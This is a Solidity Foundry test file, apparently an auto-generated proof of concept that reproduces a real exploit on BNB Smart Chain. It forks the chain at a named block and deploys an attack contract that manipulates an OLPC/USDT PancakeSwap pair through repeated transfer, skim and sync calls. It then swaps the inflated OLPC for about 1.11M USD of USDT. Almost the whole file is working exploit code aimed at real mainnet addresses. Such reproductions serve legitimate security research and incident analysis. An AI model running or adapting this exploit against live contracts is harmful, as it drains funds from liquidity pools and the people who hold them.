// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Attack Contract : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Vulnerable Contract : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Attack Tx : 0x8dabb60a94e5124462e5f494a25c14bcd52f6f4d1f7c665a249496f4c6c24764
// Block : 105326393
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 1.11M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attack_contract;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 105326392;
    uint256 constant TX_TIMESTAMP = 1781955063;
    uint256 constant TX_BLOCK_NUMBER = 105326393;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(address(attack), address(0));
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.USDT, "USDT", 1115903663412131721557252);
    }
}

contract OurAttack {
    IERC20Like private constant OLPC = IERC20Like(Addresses.OLPC);
    ICakePair private constant OLPC_PAIR = ICakePair(Addresses.Cake_LP_F365);
    IProfitSwap private constant PROFIT_SWAP = IProfitSwap(Addresses.ProfitSwap);

    function attack() external payable {
        _primeOlpcPair();
        _compoundOlpcSkims();
        _swapOlpcForUsdt();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x2cadd184) {
            _primeOlpcPair();
            _compoundOlpcSkims();
            _swapOlpcForUsdt();
            return;
        }
    }

    function _primeOlpcPair() internal {
        OLPC.transfer(Addresses.Cake_LP_F365, 1000000000000000000);
        OLPC_PAIR.sync();
        OLPC.balanceOf(Addresses.Cake_LP_F365);
    }

    function _compoundOlpcSkims() internal {
        uint256[20] memory transferAmounts = [
            uint256(7087561),
            uint256(708756),
            uint256(70875),
            uint256(7087),
            uint256(708),
            uint256(70),
            uint256(7),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0),
            uint256(0)
        ];

        for (uint256 i = 0; i < transferAmounts.length; i++) {
            OLPC.transfer(Addresses.Cake_LP_F365, transferAmounts[i]);
            OLPC_PAIR.skim(Addresses.SkimReceiver);
            OLPC_PAIR.sync();
            if (i + 1 < transferAmounts.length) OLPC.balanceOf(Addresses.Cake_LP_F365);
        }
    }

    function _swapOlpcForUsdt() internal {
        OLPC.transfer(Addresses.Cake_LP_F365, 9000000000000000000);
        PROFIT_SWAP.swap(Addresses.OLPC, 0, 1, Addresses.USDT, address(this), 781328217393);
    }
}

library Addresses {
    address internal constant attack_contract = 0x18D6c39aE9E537F948AA2212d44D8c23944fc188;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant OLPC = 0x58815CDF9955121a6274680ab396a36FC9e00000;
    address internal constant ProfitSwap = 0x5DB85D56DA09f61BeC51386F1602ccf5BF555cc0;
    address internal constant SkimReceiver = 0xc0F1Ef7FE2ae3AAD0175af192713d36eD151755a;
    address internal constant Cake_LP_F365 = 0xedB7DCB4cDFEc957F8Df5cBf5E94229a6CC9F365;
}

interface ICakePair {
    function skim(address) external;
    function sync() external;
}

interface IProfitSwap {
    function swap(address, uint256, uint256, address, address, uint256) external returns (uint256);
}
